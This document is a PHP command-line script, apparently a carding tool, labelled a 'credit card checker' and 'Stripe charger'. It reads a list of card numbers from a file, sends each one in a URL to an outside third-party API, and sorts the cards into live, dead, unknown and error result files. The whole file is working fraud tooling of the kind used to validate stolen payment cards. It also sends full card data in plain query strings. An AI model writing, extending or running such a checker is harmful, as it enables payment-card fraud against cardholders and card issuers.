<?php

// DONT CHANGE THIS

/*  ================[INFO]================
 *   AUTHOR  : ZLAXTERT
 *   SCRIPT  : CREDIT CARD CHECKER
 *   GITHUB  : https://github.com/ZLAXTERT
 *   IG      : https://instagram.com/zlaxtert
 *   VERSION : 1.1 (CLI)
 *  ======================================
 */

//SETTING 

ini_set("memory_limit", '-1');
date_default_timezone_set("Asia/Jakarta");
define("OS", strtolower(PHP_OS));

$date = date("l, d-m-Y");

//BANNER

system("clear");
echo banner();

//INPUT LIST

enterlist:
echo "\n[+] Enter your list (eg: list.txt) >> ";
$listname = trim(fgets(STDIN));
if(empty($listname) || !file_exists($listname)) {
	echo " [!] Your Fucking list not found [!]".PHP_EOL;
	goto enterlist;
}
$lists = array_unique(explode("\n",str_replace("\r","",file_get_contents($listname))));

echo "[?] Lanjutkan ? (Y/n) >> ";
$q = trim(fgets(STDIN));
$que = strtolower($q);
if($que == 'n') exit("\n[!] LABIL LU !? [!]\n\n");

//COUNT

$l = 0;
$d = 0;
$e = 0;
$u = 0;
$no = 0;
$total = count($lists);
echo "\n[+] TOTAL $total lists [+]\n\n";

//LOOPING

foreach ($lists as $list) {
     $no++;
     //API
     $url = "https://api.banditcoding.xyz/cc/v1/?cc=$list";
     
     //CURL
     
     $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
     $res = curl_exec($ch);
     curl_close($ch);
     
     //RESPONSE
     
     if(strpos($res, '"status":"success"')){
         $l++;
         file_put_contents("result/live.txt", $list.PHP_EOL, FILE_APPEND);
         echo "[$no/$total] LIVE | $list | CREDIT CARD CHECKER \n";
     }elseif(strpos($res, '"status":"failed"')){
         $d++;
         file_put_contents("result/die.txt", $list.PHP_EOL, FILE_APPEND);
         echo "[$no/$total] DIE | $list | CREDIT CARD CHECKER \n";
     }elseif(strpos($res, '"status":"error"')){
         $u++;
         file_put_contents("result/unknown.txt", $list.PHP_EOL, FILE_APPEND);
         echo "[$no/$total] UNKNOWN | $list | CREDIT CARD CHECKER \n";
     }else{
         $e++;
         file_put_contents("result/error.txt", $list.PHP_EOL, FILE_APPEND);
         echo "[x] ERROR CONNECTION [x]\n";
         echo $res;
     }
}

//END

echo "
DATE : $date
==========[INFO]==========
  TOTAL LIST : $total
  LIVE : $l
  DIE : $d
  UNKNOWN : $u
  ERROR : $e 
==========================
     THANKS FOR USING
";

function banner(){
    $banner = "

      __________  _______ _____________ _________ 
     / ___/ ___/ / ___/ // / __/ ___/ //_/ __/ _ \
    / /__/ /__  / /__/ _  / _// /__/ ,< / _// , _/
    \___/\___/  \___/_//_/___/\___/_/|_/___/_/|_| 
------------------------------------------------------
  AUTHOR  : ZLAXTERT
  VERSION : 1.1
  SCRIPT  : CREDIT CARD CHECKER STRIPE CHARGER
------------------------------------------------------
";
    return $banner;
}
